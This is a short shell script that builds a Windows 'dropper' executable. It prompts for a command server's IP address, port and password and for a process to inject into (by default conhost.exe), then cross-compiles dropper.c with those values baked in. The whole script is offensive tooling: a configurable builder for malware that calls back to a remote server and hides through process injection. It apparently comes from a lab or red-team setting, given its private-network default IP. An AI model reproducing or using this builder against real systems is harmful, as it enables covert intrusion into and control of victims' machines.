#!/bin/sh

read -p "Server IP [192.168.56.102]: " SERVER_IP
SERVER_IP=${SERVER_IP:-192.168.56.102}
read -p "Server port [9002]: " SERVER_PORT
SERVER_PORT=${SERVER_PORT:-9002}
read -p "Password [YoloSpaceHacker]: " PASSWORD
PASSWORD=${PASSWORD:-YoloSpaceHacker}
read -p "Inject thread [true]: " INJECT_THREAD
INJECT_THREAD=${INJECT_THREAD:-true}
read -p "Process name to inject [conhost.exe]: " PROCESS_NAME
PROCESS_NAME=${PROCESS_NAME:-conhost.exe}

# x86_64-w64-mingw32-gcc -o dropper dropper.c -lwsock32
# i686-w64-mingw32-gcc -o dropper dropper.c -lwsock32
x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -lwsock32 -DSERVER_IP=$SERVER_IP -DSERVER_PORT=$SERVER_PORT -DPASSWORD=$PASSWORD -DINJECT_THREAD=$INJECT_THREAD -DPROCESS_NAME=$PROCESS_NAME
